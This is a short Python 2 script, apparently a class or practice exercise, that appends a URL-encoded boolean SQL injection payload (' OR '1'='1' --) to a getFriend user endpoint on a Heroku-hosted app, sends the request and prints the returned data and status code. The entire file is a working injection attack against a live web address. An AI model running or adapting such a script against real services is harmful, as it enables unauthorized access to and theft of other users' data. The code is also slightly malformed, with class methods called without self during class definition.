import urllib2
import httplib

class ex1(object):

   def booleanattack( str ):
      return str + "'%20OR%20'1'='1'%20--%20"

   def is_request_successful(code):
      return code == 200

   a = booleanattack("https://lit-garden-23003.herokuapp.com/getFriend/user1")
   print(a)

   contents = urllib2.urlopen(a)
   print(contents.read())
   print contents.getcode()